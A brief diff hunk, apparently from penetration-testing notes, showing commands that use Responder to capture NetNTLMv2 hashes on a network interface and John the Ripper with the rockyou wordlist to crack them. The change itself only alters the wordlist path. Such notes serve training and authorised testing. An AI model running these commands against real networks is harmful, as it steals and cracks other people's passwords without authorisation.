@@ -11,7 +11,7 @@ sudo responder -I eth1
 # 3. on Kali: catch the hash -> put into hash2.txt ; download if needed rockyou.txt
 #Run
 
-john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt # to start cracking
+john --format=netntlmv2 --wordlist=rockyou.txt hash2.txt # to start cracking
 
 john --show hash2.txt # to see the cracked password
 
